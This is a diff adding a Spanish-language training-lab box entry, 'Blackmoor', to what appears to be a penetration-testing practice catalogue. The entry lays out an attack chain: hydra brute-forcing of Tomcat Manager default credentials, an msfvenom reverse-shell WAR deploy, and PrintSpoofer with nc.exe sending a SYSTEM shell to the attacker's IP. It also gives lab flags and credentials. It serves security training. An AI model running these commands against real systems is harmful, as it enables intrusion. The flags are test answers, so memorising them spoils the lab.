@@ -953,6 +953,70 @@ noise:
 
 ---
 
+## Box 13 — `Blackmoor`
+
+```
+id: 13
+name: Blackmoor
+os: windows
+difficulty: medium
+est_time: 45-75 min
+tags: [windows, workgroup, tomcat, default-creds, hydra, war-deploy, seimpersonate, printspoofer]
+
+target_ip: 10.10.14.90
+tun0_ip: 10.11.0.7
+
+services:
+  135/139/445: Windows RPC/SMB (null denegado, guest disabled -> callejón)
+  3389: RDP
+  5985: WinRM
+  8080: Apache Tomcat 9.0.30   <- el vector
+
+surface:
+  - Workgroup (NO dominio) -> kerbrute/RPC NO aplican (es la trampa conceptual).
+  - 8080: página por defecto de Tomcat 9; /manager/html -> 401 Basic (realm "Tomcat Manager Application").
+
+chain:
+  - step: foothold-tomcat-war
+    trigger: Tomcat Manager con auth Basic
+    technique: creds por defecto -> WAR deploy -> RCE
+    cheat_ref: [[10-apps-concretas]] (Tomcat) · [[05-cracking]] (hydra -C)
+    aha: auth del Manager = de la APP (tomcat-users.xml), no del SO -> brute con lista de defaults de Tomcat
+    expected_action: "hydra -C tomcat-betterdefaultpasslist.txt IP -s 8080 http-get /manager/html -> tomcat:s3cret; msfvenom -f war; deploy; curl /shell/"
+    hints:
+      - "no es dominio (workgroup) -> olvida kerbrute/RPC. El login del Manager es de la app. 10-apps."
+      - "Tomcat = creds por defecto. hydra con lista de combos (-C) de Tomcat."
+      - "dentro -> despliega un .war: msfvenom -p java/jsp_shell_reverse_tcp -f war -> /manager/text/deploy -> visita /shell/"
+    resultado: shell como svc_tomcat
+  - step: privesc-seimpersonate
+    trigger: whoami /priv de la cuenta de servicio
+    technique: SeImpersonate -> PrintSpoofer -> SYSTEM
+    cheat_ref: [[06-privesc-windows]] (SeImpersonate -> Potato)
+    aha: Server 2019 -> JuicyPotato NO va; PrintSpoofer/GodPotato SÍ
+    expected_action: ".\\PrintSpoofer64.exe -c \"C:\\Windows\\Temp\\nc.exe TU_IP 5555 -e cmd.exe\" (listener antes)"
+    hints:
+      - "cuenta de servicio -> lo primero whoami /priv. 06-privesc."
+      - "SeImpersonate Enabled = Potato. ¿cuál para Server 2019?"
+      - "PrintSpoofer (JuicyPotato patcheado en 2019). Sube nc.exe + PrintSpoofer, dispara, nc recibe SYSTEM."
+    resultado: SYSTEM
+
+creds:
+  - tomcat : s3cret   (Tomcat Manager, default-list)
+
+flags:
+  user: 6b1f0ac74d29e8530b1c7f6a24d90e8c
+  root: a4d9f1e05c73b28640a1f9c3e7b50d2a
+
+noise:
+  - SMB null/guest cerrado = callejón real (no insistas).
+  - trampa conceptual: tirar kerbrute/RPC en un WORKGROUP (no hay KDC; el auth es de la app).
+  - potato equivocado: JuicyPotato en 2019 = pierdes el tiempo (CLSID tapados).
+```
+
+**Lección pedagógica:** **auth de APP ≠ auth de SO/dominio** (workgroup → nada de kerbrute/RPC); **Tomcat Manager = creds por defecto** → `hydra -C` con lista de combos → **WAR deploy = RCE**; la cuenta de servicio trae **SeImpersonate** → **PrintSpoofer** (en 2019; JuicyPotato muerto) → SYSTEM.
+
+---
+
 ## 📈 Ideas de evolución (roadmap del proyecto)
 
 - Añadir cajas Windows (SeImpersonate → PrintSpoofer/GodPotato) y AD (roasting → DCSync) con el mismo esquema.
